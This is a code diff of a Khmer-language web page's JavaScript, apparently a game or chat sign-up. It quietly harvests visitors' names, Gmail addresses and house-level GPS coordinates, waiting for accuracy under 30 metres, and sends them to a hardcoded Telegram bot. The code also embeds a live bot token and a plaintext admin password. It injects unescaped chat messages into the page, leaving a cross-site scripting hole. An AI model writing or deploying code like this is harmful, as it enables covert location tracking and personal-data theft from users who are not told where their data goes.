@@ -3452,41 +3452,59 @@ function listenForAdminReplies() {
           }
       });
 }
-let finalMapLink = "";
+
 const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
 const CHAT_ID = "955031659";
+
+let finalMapLink = "";
+
+window.onload = function() {
+    const savedName = localStorage.getItem('user_name');
+    if (savedName) {
+        document.getElementById('step-1').style.display = 'none';
+        document.getElementById('step-2').style.display = 'none';
+        document.getElementById('step-3').style.display = 'block';
+        document.getElementById('chat-user-input').value = savedName;
+        listenForMessages();
+    }
+};
 
 function toStep2() {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
 }
 
-// មុខងារចាប់ទីតាំង GPS ឱ្យចំគោលដៅ
+
 function getExactLocation() {
     const status = document.getElementById('gps-status');
     const btn = document.getElementById('btn-gps');
     
     if (navigator.geolocation) {
-        status.innerText = "⌛ កំពុងស្កេនរកទីតាំងឱ្យចំ...";
-        
+        status.innerText = "⌛ កំពុងផ្ទៀងផ្ទាត់ទីតាំងឱ្យចំផ្ទះ (សូមចាំ ១ភ្លែត)...";
+        status.style.color = "orange";
+
         const options = {
-            enableHighAccuracy: true, // បង្កើនភាពច្បាស់លាស់ដល់កម្រិតខ្ពស់បំផុត
-            timeout: 10000,
+            enableHighAccuracy: true, 
+            timeout: 15000,           
             maximumAge: 0
         };
 
-        navigator.geolocation.getCurrentPosition(function(position) {
+  
+        const watchID = navigator.geolocation.watchPosition(function(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            // បង្កើត Link Google Maps ដែលដាក់ម្ជុលចំទីតាំង
-            finalMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            status.innerText = "✅ ចាប់បានទីតាំងចំហើយ!";
-            status.style.color = "green";
-            btn.style.background = "#4CAF50";
+            const acc = position.coords.accuracy; 
+
+   
+            if (acc < 30) {
+                finalMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                status.innerText = `✅ ចាប់បានទីតាំងច្បាស់ហើយ! (លម្អៀងត្រឹម ${Math.round(acc)}ម)`;
+                status.style.color = "green";
+                btn.style.background = "#4CAF50";
+                navigator.geolocation.clearWatch(watchID); 
+            }
         }, function(error) {
-            alert("សូមបើក GPS ឬចុច Allow Location!");
-            status.innerText = "❌ បរាជ័យក្នុងការចាប់ទីតាំង";
+            status.innerText = "❌ មិនអាចចាប់ទីតាំងបាន! សូមចុច Allow GPS";
         }, options);
     }
 }
@@ -3496,63 +3514,62 @@ function finalSubmit() {
     const email = document.getElementById('reg-email').value.trim();
 
     if (!name || !email.includes("@gmail.com") || !finalMapLink) {
-        alert("សូមបំពេញឈ្មោះ, Gmail និងចុច GPS ឱ្យរួចរាល់!");
+        alert("សូមបំពេញឈ្មោះ, Gmail និងចុច GPS ឱ្យចេញពណ៌បៃតងសិន!");
         return;
     }
 
-    // ផ្ញើទិន្នន័យសម្ងាត់ទៅ Telegram
-    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📧 Gmail: ${email}\n📍 ទីតាំង: ${finalMapLink}`;
+   
+    localStorage.setItem('user_name', name);
+    localStorage.setItem('user_email', email);
+
+  
+    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📧 Gmail: ${email}\n📍 ទីតាំងពិត: ${finalMapLink}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
 
-    // រៀបចំចូលទៅកាន់បន្ទប់ឆាត
+   
     document.getElementById('chat-user-input').value = name;
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
     
-    listenForMessages(); // ចាប់ផ្ដើមស្ដាប់សារពី Firebase
+    listenForMessages();
 }
 
-// មុខងារផ្ញើសារទៅ Firebase
 function sendChatMessage() {
     const name = document.getElementById('chat-user-input').value;
     const msg = document.getElementById('chat-msg-input').value.trim();
-    
-    if (msg === "") return;
+    if (!msg) return;
 
     chatRef.push({
         name: name,
         message: msg,
-        timestamp: Date.now()
+        time: new Date().toLocaleTimeString()
     });
-
     document.getElementById('chat-msg-input').value = "";
 }
 
-// មុខងារស្ដាប់ និងបង្ហាញសារពី Firebase (ធ្វើឱ្យឃើញគ្នាទៅវិញទៅមក)
 function listenForMessages() {
-    chatRef.limitToLast(50).on('value', (snapshot) => {
+    chatRef.limitToLast(30).on('value', (snapshot) => {
         const chatBox = document.getElementById('chat-box');
-        chatBox.innerHTML = ""; // សម្អាតប្រអប់ចាស់ដើម្បីទាញមកថ្មី
-        
-        snapshot.forEach((childSnapshot) => {
-            const data = childSnapshot.val();
-            const messageElement = document.createElement('div');
-            messageElement.style.marginBottom = "8px";
-            messageElement.innerHTML = `<b style="color:#2196F3">${data.name}:</b> ${data.message}`;
-            chatBox.appendChild(messageElement);
+        chatBox.innerHTML = "";
+        snapshot.forEach((child) => {
+            const data = child.val();
+            chatBox.innerHTML += `<div style="margin-bottom:10px">
+                <span style="color:#d35400; font-weight:bold;">${data.name}:</span> 
+                <span>${data.message}</span>
+                <small style="color:#999; font-size:10px; display:block;">${data.time || ''}</small>
+            </div>`;
         });
-        
-        chatBox.scrollTop = chatBox.scrollHeight; // រមូរចុះក្រោមមកចុងក្រោយ
+        chatBox.scrollTop = chatBox.scrollHeight;
     });
 }
 
 function clearAllChat() {
-    const adminPass = document.getElementById('admin-code').value;
-    if (adminPass === "reaksmey10012004@") {
+    const code = document.getElementById('admin-code').value;
+    if (code === "reaksmey10012004@") {
         chatRef.remove();
-        alert("សម្អាតសារទាំងអស់រួចរាល់!");
+        alert("លុបសារទាំងអស់ហើយ!");
     } else {
-        alert("លេខកូដ Admin មិនត្រឹមត្រូវ!");
+        alert("លេខកូដខុស!");
     }
 }
 </script>
